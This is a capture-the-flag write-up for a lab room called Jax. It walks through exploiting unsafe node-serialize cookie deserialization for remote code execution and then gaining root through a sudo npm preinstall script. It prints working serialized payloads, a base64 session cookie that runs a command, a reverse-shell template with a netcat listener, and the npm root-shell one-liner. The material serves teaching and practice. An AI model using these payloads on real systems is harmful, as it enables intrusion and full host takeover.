# 🎯 Jax Node.js Deserialization RCE Writeup

---

## 📋 Executive Summary

This writeup details the exploitation of a **Node.js deserialization vulnerability** combined with **broken authentication** mechanisms to achieve Remote Code Execution (RCE) and subsequent privilege escalation on the target system. The vulnerability chain allows unauthenticated attackers to execute arbitrary code with user privileges, leading to full system compromise.

---

## 🔍 Part 1: Initial Reconnaissance & Vulnerability Identification

### 1.1 Target Discovery

As soon as I accessed the target IP in the browser, the homepage revealed a basic web interface with a newsletter subscription feature. This initial observation would prove to be the entry point for our exploitation chain.

![homepage](homepage.png)

### 1.2 Source Code Analysis

Upon examining the page source code, I discovered critical JavaScript that handles the subscription functionality:

```js
document.getElementById("signup").addEventListener("click", function() {
    var date = new Date();
    date.setTime(date.getTime()+(-1*24*60*60*1000));
    var expires = "; expires="+date.toGMTString();
    document.cookie = "session=foobar"+expires+"; path=/";
    const Http = new XMLHttpRequest();
    console.log(location);
    const url=window.location.href+"?email="+document.getElementById("fname").value;
    Http.open("POST", url);
    Http.send();
    setTimeout(function() {
        window.location.reload();
    }, 500);
}); 
```

### 1.3 Vulnerability Assessment

This code immediately revealed several security flaws that could be exploited:

- 🚫 **Broken Authentication** - Hardcoded session cookie without validation
- 🔓 **Client-side Trust Issues** - Email parameter passed directly without sanitization
- 🔀 **Parameter Tampering** - User input directly influences server-side operations
- 🍪 **Cookie Manipulation** - Session cookies are predictable and modifiable
- 🎭 **Unsafe Deserialization** - The backend appears to deserialize user input

---

## 🔎 Part 2: Input Analysis & Endpoint Fuzzing

### 2.1 Initial Fuzzing Attempts

To identify additional attack surface, I conducted endpoint fuzzing:

```bash
# No additional endpoints discovered
http://10.48.144.111/FUZZ
```

This returned no meaningful results, suggesting the application relies primarily on the root endpoint.

### 2.2 Parameter Interaction Analysis

The subscription field accepts email input and displays it back on the page with the message:

```
We'll keep you updated at: <entered text>
```

Each form submission sends a POST request to the following endpoint:

```
http://10.48.144.111/?email=<Entered Text>
```

### 2.3 Initial Injection Attempts

I systematically tested common web vulnerabilities:

**Local File Inclusion (LFI)** - Attempted path traversal sequences... ❌ No success  
**SQL Injection (SQLi)** - Tried standard SQLi payloads... ❌ No success

These traditional approaches didn't yield results, indicating a more sophisticated vulnerability.

---

## 🔐 Part 3: Session Token & Base64 Encoding Discovery

### 3.1 Session Token Structure Analysis

Upon careful inspection of the session cookies, I discovered that the application encodes the email parameter into a Base64-formatted structure and assigns it as the session ID:

**Decoded Session Token Structure:**
```json
{"email":"Your Entered Text in that input field"}
```

This immediately raised red flags—the backend is serializing and deserializing user input, a dangerous practice in Node.js applications.

### 3.2 HTTP Request Analysis via Burp Suite

Using Burp Suite, I observed that the application makes two sequential requests:

1. **POST Request:** `POST /?email=<Entered Text>` - Submits user input
2. **GET Request:** `GET /` with `session=<base64 cookie>` - Retrieves the page with the session cookie

![sess](session.png)

### 3.3 Session Flow Understanding

The complete workflow operates as follows:

1. User submits email via the form
2. Email is displayed back on the page (reflected)
3. Email is encoded to Base64
4. Encoded session ID is set as a cookie
5. Page is refreshed with the new session

This suggests the backend is **serializing and deserializing** the session token on each request.

---

## 💣 Part 4: Node.js Deserialization Vulnerability Exploitation

### 4.1 Vulnerability Background

Node.js has a known critical vulnerability in its serialization mechanism where **arbitrary functions can be serialized and executed upon deserialization**. This can be exploited for Remote Code Execution (RCE).

**Reference:** [Exploiting Node.js Deserialization for RCE](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/)

### 4.2 Exploitation Workflow

The attack follows these steps:

1. ✏️ Create a malicious JavaScript file with executable functions
2. 🔄 Serialize the file using Node.js serialization library
3. 🔐 Encode the serialized payload in Base64
4. 🍪 Inject the payload as a session cookie
5. 🎯 Trigger deserialization by refreshing the page
6. ⚡ Achieve code execution on the server

### 4.3 Proof of Concept - Directory Listing

To verify the vulnerability, I created a test payload for listing root files:

```js
var y = {
    rce : function(){
        require('child_process').exec('ls /', function(error, stdout, stderr) { 
            console.log(stdout) 
        });
    },
}
var serialize = require('node-serialize');
console.log("Serialized: \n" + serialize.serialize(y));
```

### 4.4 Proof of Concept - ICMP Validation

Before attempting full RCE, I validated code execution with a simple ICMP ping:

```js
var y = {
    email : function(){
        require('child_process').exec('ping -c 1 192.168.246.164', function(error, stdout, stderr) { 
            console.log(stdout) 
        });
    },
}
var serialize = require('node-serialize');
console.log("Serialized: \n" + serialize.serialize(y));
```

---

## 🎯 Part 5: Payload Serialization & Encoding

### 5.1 Node Serialization Output

Running the serialization script produced the following encoded function:

```node
Serialized: 
{"email":"_$$ND_FUNC$$_function(){\n require('child_process').exec('ping -c 1 10.49.171.98', function(error, stdout, stderr) { console.log(stdout) });\n }"}
```

### 5.2 Base64 Encoding

Converting the serialized JSON to Base64 encoding:

```base64
eyJlbWFpbCI6Il8kJE5EX0ZVTkMkJF9mdW5jdGlvbigpe1xuIHJlcXVpcmUoJ2NoaWxkX3Byb2Nlc3MnKS5leGVjKCdwaW5nIC1jIDEgMTAuNDkuMTcxLjk4JywgZnVuY3Rpb24oZXJyb3IsIHN0ZG91dCwgc3RkZXJyKSB7IGNvbnNvbGUubG9nKHN0ZG91dCkgfSk7XG4gfSJ9
```

### 5.3 Injection & Verification

The payload is injected as a session cookie:

```
Cookie: session=eyJlbWFpbCI6Il8kJE5EX0ZVTkMkJF9mdW5jdGlvbigpe1xuIHJlcXVpcmUoJ2NoaWxkX3Byb2Nlc3MnKS5leGVjKCdwaW5nIC1jIDEgMTAuNDkuMTcxLjk4JywgZnVuY3Rpb24oZXJyb3IsIHN0ZG91dCwgc3RkZXJyKSB7IGNvbnNvbGUubG9nKHN0ZG91dCkgfSk7XG4gfSJ9
```

After refreshing the page, the payload is deserialized and executed on the server.

### 5.4 ICMP Listener Setup

Before triggering the payload, set up an ICMP listener on your attack machine:

```bash
sudo tcpdump -i tun0 icmp
```

### 5.5 Verification & Response

After injecting the cookie and refreshing the page, the homepage confirms successful code execution:

![after](after.png)

The ICMP packets are received on the listener, confirming the target system executed our command.

---

## 💻 Part 6: Remote Code Execution (Reverse Shell)

### 6.1 Reverse Shell Exploitation

Now that code execution is confirmed, the next step is to establish a reverse shell for interactive access:

```js
var y = {
    "email": function(){
        eval(String.fromCharCode(your_payload))
    }
};

var serialize = require('node-serialize');
var serialized = serialize.serialize(y);
console.log(serialized)
```

### 6.2 Payload Delivery & Listener Setup

1. Generate your reverse shell payload using msfvenom or similar tools
2. Encode the payload using String.fromCharCode() for bypass
3. Serialize the payload as described in previous sections
4. Encode to Base64 and inject as session cookie
5. Set up the listening port on your attack machine:

```bash
nc -lvnp 4444
```

### 6.3 Connection & User Flag Retrieval

Upon successful exploitation, a reverse shell connection is established:

```bash
# Connection received!
$ whoami
dylan
$ pwd
/home/dylan
$ cat user.txt
[USER FLAG CAPTURED]
```

---

## 🚀 Part 7: Privilege Escalation

### 7.1 Sudo Privilege Analysis

After gaining initial access as the `dylan` user, I checked for privilege escalation opportunities:

```bash
$ sudo -l
Matching Defaults entries for dylan on jason:
    env_reset, mail_badpath, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User dylan may run the following commands as root:
    (root) NOPASSWD: /usr/bin/npm
```

The `npm` command can be executed as root without a password—a perfect privilege escalation vector!

### 7.2 NPM Privilege Escalation Technique

The `npm` package manager has a known privilege escalation path through the `preinstall` script execution. By creating a malicious `package.json`, we can execute arbitrary commands with root privileges:

### 7.3 Exploitation Steps

```bash
dylan@jason:~$ TF=$(mktemp -d)
dylan@jason:~$ echo '{"scripts": {"preinstall": "/bin/sh"}}' > $TF/package.json
dylan@jason:~$ sudo npm -C $TF --unsafe-perm i

> @ preinstall /tmp/tmp.mskP1rW5qW
> /bin/sh
#
```

### 7.4 Root Access Verification

Verify root access with the `id` command:

```bash
# id
uid=0(root) gid=0(root) groups=0(root)
# whoami
root
```

### 7.5 Root Flag Retrieval

Navigate to the root directory and capture the final flag:

```bash
# cat /root/root.txt
[ROOT FLAG CAPTURED]
```

---

## 📊 Attack Chain Summary

```
┌─────────────────────────────────────────────┐
│ 1. Reconnaissance & Source Code Analysis    │
├─────────────────────────────────────────────┤
│ 2. Input Validation Testing                 │
├─────────────────────────────────────────────┤
│ 3. Session Token & Encoding Discovery       │
├─────────────────────────────────────────────┤
│ 4. Node.js Deserialization Vulnerability    │
├─────────────────────────────────────────────┤
│ 5. Payload Development & Serialization      │
├─────────────────────────────────────────────┤
│ 6. Remote Code Execution (Reverse Shell)    │
├─────────────────────────────────────────────┤
│ 7. Privilege Escalation via NPM             │
├─────────────────────────────────────────────┤
│ 8. Full System Compromise ✅                 │
└─────────────────────────────────────────────┘
```

---

## 🔑 Key Takeaways

✅ **Never trust user input** - Always validate and sanitize data, especially from external sources  
✅ **Avoid unsafe deserialization** - Use safe serialization methods with type checking  
✅ **Principle of least privilege** - Never grant unnecessary sudo permissions to users  
✅ **Regular security audits** - Proactively identify and remediate vulnerabilities  
✅ **Defense in depth** - Layer multiple security controls rather than relying on a single mechanism

---

## 🛠️ Tools Used

- 🔧 **Burp Suite** - HTTP request interception and analysis
- 🖥️ **Netcat** - Reverse shell listener and network communication
- 📡 **tcpdump** - ICMP packet analysis and verification
- 🎯 **Node.js Serialize** - Payload serialization
- 🔓 **Bash** - Shell access and system exploration

---

## 📚 References & Further Reading

- [Node.js Deserialization RCE](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/)
- [OWASP: Unsafe Deserialization](https://owasp.org/www-community/deserialization-of-untrusted-data)
- [NPM Privilege Escalation](https://www.exploit-db.com/exploits/39995)

---

**Last Updated:** 2026 | **Room:** Jax | **Difficulty:** Medium | **Status:** ✅ Complete
